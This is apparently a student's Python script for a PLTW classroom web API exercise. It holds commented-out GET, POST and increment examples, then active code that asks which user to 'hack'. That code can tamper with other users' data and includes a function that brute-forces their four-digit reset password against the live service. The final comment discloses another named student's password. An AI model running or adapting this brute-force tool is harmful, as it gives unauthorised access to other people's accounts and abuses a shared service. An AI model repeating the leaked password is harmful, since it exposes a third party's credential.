
# Creating the endpoint
#  import requests

# #change the userName to your name
# userName = "AkhilAayush"

# url = "https://cs-api.pltw.org/newuser/"

# response = requests.post(url+userName)

# #url is the web location that is storing and hosting the data.
# url = "https://cs-api.pltw.org/"

# #pString is the method used to post a string to an endpoint created with new user.
# pString = "string/?text="

# #A string without any spaces or special characters

# textToPost = 'hello world'
# response2 = requests.post(response.text+pString+textToPost)

# print(response2.text)







# #Post Request
# import requests

# url = "https://cs-api.pltw.org/AkMuthy"
# pString = "?text="
# textToPost = "Hello"
# response = requests.post(url + pString + textToPost)
# print(response.text)
# print(response.status_code)


# print(url + pString + textToPost)



# #Get Request
# import requests

# url = "https://cs-api.pltw.org/"

# userName = "AkMuthy"

# response = requests.get(url + userName)
# print(response.status_code)
# print(response.headers)
# print(response.text)

# #Increment code
# import requests

# url = "https://cs-api.pltw.org/AkMuthy/increment?id="
# num = str(2)

# for _ in range(3):
#     response = requests.post(url+num)

# print(response.status_code)
# print(response.headers)
# print(response.text)


# # Final Code

import requests

API = "https://cs-api.pltw.org/"

def get_user_input():
    user = input("Which user would you like to hack: ")
    return user

def build_url(user):
    return API + user

def INC(url):
    id = "increment?id="  
    num = input("What index would you like to change: ")
    count = int(input("What number would you like to change it to: "))
    
    for _ in range(count):
       
        inc_url = url + id + num
        inc_response = requests.post(inc_url)
        
        print(inc_response.status_code)
        print(inc_response.headers)
        print(inc_response.text)

def POST(url):
    pString = "?text="  
    my_text = input("What do you want to post: ")
    post_url = url + pString + my_text
    
    post_response = requests.post(post_url)
    
    print(post_response.status_code)
    print(post_response.headers)
    print(post_response.text)

def GET(url):
    get_response = requests.get(url)
    print(get_response.status_code)
    print(get_response.headers)
    print(get_response.text)

def CLEAR(url):
    password = input("What is the user's password: ")
    cString = "reset?password="
    clear_response = requests.post(url+cString+password)
    print(clear_response.status_code)
    print(clear_response.headers)
    print(clear_response.text)

def HACK(url):
    print("Attempting to brute-force password...")
    attempts = 0
    for i in range(10000):
        guess = str(i).zfill(4)
        attempts += 1
        clear_response = requests.post(url + "reset?password=" + guess)
        response_text = clear_response.text.lower()
        if "password reset successful" in response_text:  
            print(f"Password found: {guess}")
            print(f"Total attempts: {attempts}")
            return guess
    return None


user = get_user_input()
url = build_url(user)


user_response = requests.get(url)
check_user = user_response.text

if "Error: No such user." in check_user:
    answer = input("Do you want to create this user (Y/N): ")
    if answer.lower() == "y":
        my_response = requests.post(url)  
        print(my_response.status_code)
        print(my_response.headers)
        print(my_response.text)

else:
    action = input("Choose an action: [1] Increment, [2] Post, [3] Get, [4] Clear [5] Hack: ")

    if action == "1":
        inc_count = input("How many times: ")
        for _ in range(int(inc_count)):
            INC(url)

    elif action == "2":
        post_count = input("How many times: ")
        for _ in range(int(post_count)):
            POST(url)

    elif action == "3":
        GET(url)

    elif action == "4":
        CLEAR(url)
    
    elif action == "5":
        HACK(url)

    else:
        print("Invalid action selected.")




#Karthik's password is 8833



    







